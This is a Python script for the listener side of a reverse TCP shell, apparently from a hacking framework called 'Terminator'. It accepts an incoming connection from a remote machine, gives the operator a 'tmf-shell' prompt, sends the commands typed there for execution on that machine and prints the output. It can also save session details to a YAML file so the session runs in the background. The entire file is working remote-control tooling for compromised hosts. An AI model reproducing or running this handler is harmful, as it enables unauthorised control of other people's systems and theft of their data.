import sys
import socket
import colorama
import time
import os
import datetime
from colorama import Fore
colorama.init()
if len(sys.argv) < 3:
    sys.exit()

nowdate = datetime.datetime.now()
timerun = nowdate.strftime("%H:%M:%S")
HOST = sys.argv[1]
PORT = int(sys.argv[2])
PORT2 = sys.argv[2]

cmds = '''
Shell Commands
==============

    Command                     Description
    -------                     -----------
    background                  Background the Session (Max. 1) 
'''
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))

s.listen(1)
while True:
    print(Fore.BLUE+'[*]'+Fore.RESET+f' Started Reverse TCP Connection At {HOST}:{PORT}')
    client = s.accept()
    conf = ','
    hostName = socket.gethostname()
    ip = socket.gethostbyname(hostName)
    print(Fore.YELLOW+'[*]'+Fore.RESET+' Started Shell, Client Connected: {}'.format(ip)+' Client HostName: {}'.format(hostName)+f' At ({timerun})')
    time.sleep(1)
    while True:
        try:
            cmd = input('\033[4mtmf\033[0m-\033[4mshell\033[0m > ').strip(" ")
        except KeyboardInterrupt:
            print(Fore.RED+'[-]'+Fore.RESET+' Stopping Connection...')
            break
        client[0].send(cmd.encode())
        if cmd.lower() in ['quit', 'exit']:
            break
        elif cmd.lower() in ['help', '?']:
            print(cmds)
        elif cmd.lower() in ['background']:
            print(Fore.BLUE+'[*]'+Fore.RESET+' Backgrounding Session...')
            try:
                if os.path.exists("/usr/share/Terminator/core/session"):
                    pass
                else:
                    os.mkdir("/usr/share/Terminator/core/session")
                if os.path.exists("/usr/share/Terminator/core/session/session.yaml"):
                    print(Fore.RED+'[-]'+Fore.RESET+' Max. 1 Sessions!')
                else:
                    ipc = "{}".format(ip)
                    host = "{}".format(hostName)
                    os.system('touch /usr/share/Terminator/session/session.yaml > /dev/null 2>&1')
                    try:
                        with open("/usr/share/Terminator/core/session/session.yaml", "w") as f:
                            f.write(ipc)
                            f.write("\n"+host)
                            f.write("\n"+HOST)
                            f.write("\n"+PORT2)
                            f.close()
                    except:
                        pass
                    print(Fore.YELLOW+'[+]'+Fore.RESET+' Running At Background')
                    break
            except:
                pass
        result = client[0].recv(1024).decode()
        print(result)
    client[0].close()
    cmd = input(Fore.CYAN+'[?]'+Fore.RESET+' Stop Connection? (Y/n): ') or 'n'
    if cmd.lower() in ['y', 'yes']:
        break
s.close()
